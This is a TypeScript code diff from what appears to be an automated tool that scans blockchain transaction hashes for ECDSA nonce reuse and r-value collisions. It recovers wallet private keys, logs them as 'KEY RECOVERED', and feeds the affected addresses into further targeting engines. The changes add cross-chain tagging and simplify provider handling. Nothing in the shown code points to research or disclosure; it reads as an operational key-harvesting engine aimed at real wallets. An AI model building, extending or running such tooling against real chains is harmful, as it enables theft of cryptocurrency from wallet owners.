@@ -622,18 +622,30 @@ export async function startAutonomousRunner(opts: {
       state.statusMessage = `E0: extracting ECDSA from ${txBatch.length} tx hashes (${pool.txHashProgress.processed}/${pool.txHashProgress.total} done)`;
       log(`Engine 0 (TX-ECDSA): processing ${txBatch.length} tx hashes | remaining: ${pool.pendingTxHashes.length}`);
       try {
-        const e0Provider = new ethers.JsonRpcProvider(RPC);
-        const e0Result   = await processTxHashBatch(txBatch, e0Provider);
+        // No external provider needed — processTxHashBatch resolves chains internally
+        const e0Result = await processTxHashBatch(txBatch);
         pool.txHashProgress.processed += e0Result.processed;
 
+        // Log which chains produced hits this batch
+        if (e0Result.fetched > 0) {
+          const chainSummary = Object.entries(e0Result.chainHits)
+            .map(([c, n]) => `${c}:${n}`)
+            .join(" | ");
+          log(`Engine 0: fetched ${e0Result.fetched}/${txBatch.length} | chains: ${chainSummary} | failed: ${e0Result.failed}`);
+        }
+
         for (const f of e0Result.findings) {
+          const chainTag = f.chain1 && f.chain2 && f.chain1 !== f.chain2
+            ? ` [cross-chain: ${f.chain1}→${f.chain2}]`
+            : f.chain1 ? ` [${f.chain1}]` : "";
+
           findings.push({
             engine:      "e0_tx_ecdsa",
             kind:        f.attackType,
             address:     f.address,
             privateKey:  f.recoveredPrivKey,
             value:       f.sharedR ?? f.attackType,
-            detail:      f.detail,
+            detail:      f.detail + chainTag,
             txHash:      f.txHash1,
             confidence:  f.confidence,
             discoveredAt: f.discoveredAt,
@@ -644,29 +656,24 @@ export async function startAutonomousRunner(opts: {
             pool.confirmedPrivateKeys.add(f.recoveredPrivKey);
             if (!state.recoveredKeys.includes(f.recoveredPrivKey)) {
               state.recoveredKeys.push(f.recoveredPrivKey);
-              log(`🔑 ENGINE 0 KEY RECOVERED: ${f.address} → ${f.recoveredPrivKey.slice(0, 18)}… (nonce reuse in ${f.txHash1.slice(0, 14)}… + ${f.txHash2?.slice(0, 14) ?? "?"}…)`);
+              log(`ENGINE 0 KEY RECOVERED: ${f.address} → ${f.recoveredPrivKey.slice(0, 18)}… (nonce reuse${f.chain1 && f.chain2 ? ` across ${f.chain1}+${f.chain2}` : ""})`);
             }
-            // Feed recovered addresses into all other engines for max coverage
             pool.pendingE1TargetedAddresses.add(f.address);
             pool.pendingOsintAddresses.add(f.address);
             pool.pendingPeelAddresses.add(f.address);
           }
 
-          // Any r-collision across different addresses feeds E1 targeted scan
           if (f.attackType === "cross_address_r_collision") {
             pool.pendingE1TargetedAddresses.add(f.address);
           }
         }
 
         if (e0Result.findings.length > 0) {
-          log(`Engine 0: ${e0Result.fetched} txs fetched, ${e0Result.findings.length} finding(s), ${e0Result.failed} failed`);
+          log(`Engine 0: ${e0Result.findings.length} finding(s) — ${e0Result.findings.filter(f => f.recoveredPrivKey).length} keys recovered`);
         }
 
-        // ── Persist checkpoint + registry so restarts skip done work ──────
-        // Checkpoint: append the hashes we just processed (fetched OR failed)
+        // ── Persist checkpoint + registry ─────────────────────────────────
         appendProcessedHashes(TX_CHECKPOINT_FILE, txBatch);
-        // Registry: overwrite with the current in-memory signature index
-        // (save every 5 batches to reduce I/O — still very crash-safe)
         if (pool.txHashProgress.processed % 125 === 0 || pool.pendingTxHashes.length === 0) {
           saveRegistryToFile(TX_REGISTRY_FILE);
           log(`Engine 0: checkpoint saved — ${pool.txHashProgress.processed}/${pool.txHashProgress.total} done`);
@@ -674,7 +681,6 @@ export async function startAutonomousRunner(opts: {
       } catch (e) {
         log(`Engine 0 error: ${e}`);
         state.errors++;
-        // Still checkpoint the batch even on error — prevents infinite retry loops
         appendProcessedHashes(TX_CHECKPOINT_FILE, txBatch);
       }
     }
